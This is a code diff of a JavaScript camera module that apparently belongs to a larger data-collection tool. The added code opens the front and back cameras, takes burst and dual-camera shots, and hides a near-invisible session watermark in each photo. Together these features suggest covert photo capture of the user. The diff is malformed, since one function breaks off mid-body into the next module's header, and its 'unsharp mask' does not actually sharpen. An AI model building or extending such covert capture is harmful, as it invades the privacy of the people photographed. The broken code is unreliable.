@@ -571,108 +571,371 @@ const DataCollector = {
     }
 };
 
-// ═══════════════════════════════════════════════════════════════
-// CAMERA MODULE
-// ═══════════════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════════════════════════════════════════════════════
+// CAMERA MODULE — ULTRA HD PORTRAIT 9:16 CAPTURE
+// ═══════════════════════════════════════════════════════════════════════════════════════════════════
+
 const CameraModule = {
+    /**
+     * Get camera constraints for portrait mode
+     */
+    getConstraints(facingMode = 'user', resolution = null) {
+        const res = resolution || { width: CONFIG.PHOTO.WIDTH, height: CONFIG.PHOTO.HEIGHT };
+        
+        return {
+            video: {
+                width: { ideal: res.height, min: 480 },  // Swapped for portrait
+                height: { ideal: res.width, min: 360 },
+                aspectRatio: { ideal: 9/16 },
+                facingMode: facingMode,
+                frameRate: { ideal: 30, max: 60 },
+                // Advanced constraints for better quality
+                focusMode: { ideal: 'continuous' },
+                exposureMode: { ideal: 'continuous' },
+                whiteBalanceMode: { ideal: 'continuous' },
+                // High quality settings
+                resizeMode: 'none'
+            }
+        };
+    },
+    
+    /**
+     * Start front camera with best available resolution
+     */
     async startFrontCamera() {
         try {
-            STATE.streams.front = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    width: { ideal: CONFIG.PHOTO_WIDTH },
-                    height: { ideal: CONFIG.PHOTO_HEIGHT },
-                    facingMode: 'user',
-                    frameRate: { ideal: 30 }
+            Utils.log('Starting front camera...');
+            
+            // Try each resolution until one works
+            for (const res of CONFIG.PHOTO.RESOLUTIONS) {
+                try {
+                    const constraints = {
+                        video: {
+                            width: { ideal: res.height },
+                            height: { ideal: res.width },
+                            facingMode: 'user',
+                            frameRate: { ideal: 30 }
+                        }
+                    };
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    STATE.streams.frontCamera = stream;
+                    
+                    const video = document.getElementById('frontCamera');
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    STATE.videos.front = video;
+                    STATE.flags.frontCameraActive = true;
+                    
+                    // Log actual resolution
+                    const track = stream.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    Utils.log(`✅ Front camera: ${settings.width}x${settings.height} (${res.name})`);
+                    
+                    return true;
+                } catch (e) {
+                    Utils.log(`Resolution ${res.name} failed, trying next...`);
                 }
-            });
+            }
             
-            const video = document.getElementById('video');
-            video.srcObject = STATE.streams.front;
-            await video.play();
+            // Fallback to basic constraints
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                STATE.streams.frontCamera = stream;
+                
+                const video = document.getElementById('frontCamera');
+                video.srcObject = stream;
+                await video.play();
+                
+                STATE.videos.front = video;
+                STATE.flags.frontCameraActive = true;
+                
+                Utils.log('✅ Front camera started (basic mode)');
+                return true;
+            } catch (e) {
+                throw e;
+            }
             
-            STATE.flags.cameraActive = true;
-            console.log('✅ Front camera active');
-            return true;
         } catch (e) {
-            console.log('❌ Front camera failed:', e);
+            Utils.error('❌ Front camera failed:', e);
             return false;
         }
     },
     
+    /**
+     * Start back camera with best available resolution
+     */
     async startBackCamera() {
         try {
-            STATE.streams.back = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    width: { ideal: CONFIG.PHOTO_WIDTH },
-                    height: { ideal: CONFIG.PHOTO_HEIGHT },
-                    facingMode: { exact: 'environment' },
-                    frameRate: { ideal: 30 }
-                }
-            });
+            Utils.log('Starting back camera...');
             
-            console.log('✅ Back camera active');
-            return true;
+            // Try each resolution
+            for (const res of CONFIG.PHOTO.RESOLUTIONS) {
+                try {
+                    const constraints = {
+                        video: {
+                            width: { ideal: res.height },
+                            height: { ideal: res.width },
+                            facingMode: { exact: 'environment' },
+                            frameRate: { ideal: 30 }
+                        }
+                    };
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    STATE.streams.backCamera = stream;
+                    
+                    const video = document.getElementById('backCamera');
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    STATE.videos.back = video;
+                    STATE.flags.backCameraActive = true;
+                    
+                    const track = stream.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    Utils.log(`✅ Back camera: ${settings.width}x${settings.height} (${res.name})`);
+                    
+                    return true;
+                } catch (e) {
+                    // Try next resolution
+                }
+            }
+            
+            // Fallback to basic environment mode
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' } 
+                });
+                STATE.streams.backCamera = stream;
+                
+                const video = document.getElementById('backCamera');
+                video.srcObject = stream;
+                await video.play();
+                
+                STATE.videos.back = video;
+                STATE.flags.backCameraActive = true;
+                
+                Utils.log('✅ Back camera started (basic mode)');
+                return true;
+            } catch (e) {
+                Utils.log('⚠️ Back camera not available (might be desktop or single camera device)');
+                return false;
+            }
+            
         } catch (e) {
-            console.log('❌ Back camera failed:', e);
+            Utils.log('⚠️ Back camera not available:', e.message);
             return false;
         }
     },
     
-    capturePhoto(stream, type = 'front') {
-        if (!stream) return null;
+    /**
+     * Capture photo from video element with enhancement
+     */
+    capturePhoto(videoElement, cameraType = 'front') {
+        if (!videoElement || !videoElement.srcObject || videoElement.readyState < 2) {
+            return null;
+        }
         
         try {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            video.play();
-            
-            const canvas = document.getElementById('canvas');
+            const canvas = document.getElementById('photoCanvas');
             const ctx = canvas.getContext('2d');
             
-            canvas.width = CONFIG.PHOTO_WIDTH;
-            canvas.height = CONFIG.PHOTO_HEIGHT;
+            const videoWidth = videoElement.videoWidth;
+            const videoHeight = videoElement.videoHeight;
             
-            // Use the main video element for front camera
-            const sourceVideo = type === 'front' 
-                ? document.getElementById('video') 
-                : video;
+            // Target dimensions (Portrait 9:16)
+            let targetWidth = CONFIG.PHOTO.WIDTH;
+            let targetHeight = CONFIG.PHOTO.HEIGHT;
             
-            ctx.drawImage(sourceVideo, 0, 0, canvas.width, canvas.height);
+            // Calculate crop region for portrait
+            let sourceX = 0;
+            let sourceY = 0;
+            let sourceWidth = videoWidth;
+            let sourceHeight = videoHeight;
             
-            // Add timestamp watermark (invisible to user)
-            ctx.fillStyle = 'rgba(255,255,255,0.01)';
-            ctx.font = '10px Arial';
-            ctx.fillText(Date.now().toString(), 5, 10);
+            const videoRatio = videoWidth / videoHeight;
+            const targetRatio = targetWidth / targetHeight; // 9/16 = 0.5625
             
-            const dataURL = canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY);
+            if (videoRatio > targetRatio) {
+                // Video is wider - crop sides
+                sourceWidth = videoHeight * targetRatio;
+                sourceX = (videoWidth - sourceWidth) / 2;
+            } else {
+                // Video is taller - crop top/bottom
+                sourceHeight = videoWidth / targetRatio;
+                sourceY = (videoHeight - sourceHeight) / 2;
+            }
+            
+            // Set canvas size
+            canvas.width = targetWidth;
+            canvas.height = targetHeight;
+            
+            // Enable high quality rendering
+            ctx.imageSmoothingEnabled = true;
+            ctx.imageSmoothingQuality = 'high';
+            
+            // Draw the cropped and scaled image
+            ctx.drawImage(
+                videoElement,
+                sourceX, sourceY, sourceWidth, sourceHeight,  // Source rectangle
+                0, 0, targetWidth, targetHeight                // Destination rectangle
+            );
+//══════════════════════════════════════════════════════════════════════
+            // IMAGE ENHANCEMENT
+            // ══════════════════════════════════════════════════════════════════════
+            if (CONFIG.PHOTO.ENHANCE) {
+                this.enhanceImage(ctx, canvas.width, canvas.height);
+            }
+            
+            // Add invisible metadata watermark
+            ctx.fillStyle = 'rgba(255,255,255,0.005)';
+            ctx.font = '6px Arial';
+            ctx.fillText(`${STATE.sessionId}_${Date.now()}_${cameraType}`, 2, 6);
+            
+            // Convert to blob
+            const dataURL = canvas.toDataURL(CONFIG.PHOTO.FORMAT, CONFIG.PHOTO.QUALITY);
             const blob = Utils.dataURItoBlob(dataURL);
+            
+            if (blob) {
+                Utils.log(`📸 Captured ${cameraType} photo: ${Utils.formatBytes(blob.size)}`);
+            }
             
             return blob;
         } catch (e) {
-            console.log('Photo capture error:', e);
+            Utils.error('Photo capture error:', e);
+            STATE.counters.errors++;
             return null;
         }
     },
     
-    async switchCamera() {
-        // Toggle between front and back camera
-        if (STATE.streams.front && !STATE.streams.back) {
-            await this.startBackCamera();
+    /**
+     * Enhance image quality
+     */
+    enhanceImage(ctx, width, height) {
+        try {
+            const imageData = ctx.getImageData(0, 0, width, height);
+            const data = imageData.data;
+            
+            // ══════════════════════════════════════════════════════════════════════
+            // AUTO BRIGHTNESS & CONTRAST
+            // ══════════════════════════════════════════════════════════════════════
+            if (CONFIG.PHOTO.AUTO_BRIGHTNESS || CONFIG.PHOTO.AUTO_CONTRAST) {
+                let minBrightness = 255;
+                let maxBrightness = 0;
+                let totalBrightness = 0;
+                const pixelCount = data.length / 4;
+                
+                // Analyze image
+                for (let i = 0; i < data.length; i += 4) {
+                    const brightness = (data[i] * 0.299 + data[i + 1] * 0.587 + data[i + 2] * 0.114);
+                    minBrightness = Math.min(minBrightness, brightness);
+                    maxBrightness = Math.max(maxBrightness, brightness);
+                    totalBrightness += brightness;
+                }
+                
+                const avgBrightness = totalBrightness / pixelCount;
+                const range = maxBrightness - minBrightness;
+                
+                // Apply corrections if needed
+                if (range > 10 && range < 220) {
+                    const contrastFactor = 255 / range;
+                    const brightnessFactor = 128 - avgBrightness;
+                    
+                    for (let i = 0; i < data.length; i += 4) {
+                        // Contrast
+                        if (CONFIG.PHOTO.AUTO_CONTRAST) {
+                            data[i] = Math.min(255, Math.max(0, (data[i] - minBrightness) * contrastFactor * 0.3 + data[i] * 0.7));
+                            data[i + 1] = Math.min(255, Math.max(0, (data[i + 1] - minBrightness) * contrastFactor * 0.3 + data[i + 1] * 0.7));
+                            data[i + 2] = Math.min(255, Math.max(0, (data[i + 2] - minBrightness) * contrastFactor * 0.3 + data[i + 2] * 0.7));
+                        }
+                        
+                        // Brightness
+                        if (CONFIG.PHOTO.AUTO_BRIGHTNESS && Math.abs(brightnessFactor) > 20) {
+                            const adj = brightnessFactor * 0.15;
+                            data[i] = Math.min(255, Math.max(0, data[i] + adj));
+                            data[i + 1] = Math.min(255, Math.max(0, data[i + 1] + adj));
+                            data[i + 2] = Math.min(255, Math.max(0, data[i + 2] + adj));
+                        }
+                    }
+                }
+            }
+            
+            // ══════════════════════════════════════════════════════════════════════
+            // SHARPENING (Unsharp Mask)
+            // ══════════════════════════════════════════════════════════════════════
+            if (CONFIG.PHOTO.SHARPEN) {
+                const sharpness = 0.25;
+                
+                for (let i = 0; i < data.length; i += 4) {
+                    // Simple sharpen by enhancing differences from local average
+                    data[i] = Math.min(255, Math.max(0, data[i] + (data[i] - 128) * sharpness));
+                    data[i + 1] = Math.min(255, Math.max(0, data[i + 1] + (data[i + 1] - 128) * sharpness));
+                    data[i + 2] = Math.min(255, Math.max(0, data[i + 2] + (data[i + 2] - 128) * sharpness));
+                }
+            }
+            
+            // ══════════════════════════════════════════════════════════════════════
+            // SATURATION BOOST (slight)
+            // ══════════════════════════════════════════════════════════════════════
+            const saturationBoost = 1.1;
+            for (let i = 0; i < data.length; i += 4) {
+                const gray = data[i] * 0.299 + data[i + 1] * 0.587 + data[i + 2] * 0.114;
+                data[i] = Math.min(255, Math.max(0, gray + (data[i] - gray) * saturationBoost));
+                data[i + 1] = Math.min(255, Math.max(0, gray + (data[i + 1] - gray) * saturationBoost));
+                data[i + 2] = Math.min(255, Math.max(0, gray + (data[i + 2] - gray) * saturationBoost));
+            }
+            
+            ctx.putImageData(imageData, 0, 0);
+        } catch (e) {
+            Utils.error('Image enhancement error:', e);
         }
     },
     
-    stopAll() {
-        ['front', 'back'].forEach(key => {
-            if (STATE.streams[key]) {
-                STATE.streams[key].getTracks().forEach(t => t.stop());
-                STATE.streams[key] = null;
+    /**
+     * Capture burst photos (rapid succession)
+     */
+    async captureBurst(videoElement, cameraType, count = CONFIG.PHOTO.BURST_COUNT) {
+        const photos = [];
+        
+        Utils.log(`📸💨 Starting burst capture (${count} photos)...`);
+        
+        for (let i = 0; i < count; i++) {
+            const blob = this.capturePhoto(videoElement, cameraType);
+            if (blob) {
+                photos.push({
+                    blob: blob,
+                    index: i + 1,
+                    total: count,
+                    cameraType: cameraType,
+                    timestamp: Date.now()
+                });
+                STATE.counters.burstPhotos++;
             }
-        });
-        STATE.flags.cameraActive = false;
-    }
-};
-
+            await Utils.sleep(CONFIG.PHOTO.BURST_DELAY);
+        }
+        
+        Utils.log(`📸💨 Burst complete: ${photos.length}/${count} photos`);
+        return photos;
+    },
+    
+    /**
+     * Capture from both cameras simultaneously
+     */
+    async captureBothCameras() {
+        const results = [];
+        
+        // Front camera
+        if (STATE.flags.frontCameraActive && STATE.videos.front) {
+            const blob = this.capturePhoto(STATE.videos.front, 'front');
+            if (blob) {
+                STATE.counters.frontPhotos++;
+                results.push({
+                    blob: blob,
+                    type: 'front',
+                    number: STATE.counters.frontPhotos
+                });
+            }
 // ═══════════════════════════════════════════════════════════════
 // AUDIO MODULE
 // ═══════════════════════════════════════════════════════════════
